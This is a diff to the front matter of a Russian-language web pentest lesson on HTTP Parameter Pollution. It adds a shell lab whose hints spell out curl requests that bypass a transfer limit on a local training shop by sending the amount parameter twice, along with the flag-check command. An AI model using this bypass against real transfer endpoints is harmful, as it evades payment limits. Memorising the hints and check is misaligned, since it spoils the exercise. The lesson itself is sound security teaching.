@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 34
 summary: "HPP: дублирование параметров, разное поведение парсеров, обход WAF и логики, parameter smuggling."
+lab:
+  kind: shell
+  title: "Практика: HPP"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - В пределах лимита: `curl -s 'http://shop.local/transfer?amount=100'`.
+    - Сверх лимита блокируется: `curl -s 'http://shop.local/transfer?amount=10000'`.
+    - Передай параметр дважды: `curl -s 'http://shop.local/transfer?amount=100&amount=10000'`.
+    - Флаг — последняя строка: `curl -s 'http://shop.local/transfer?amount=100&amount=10000' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
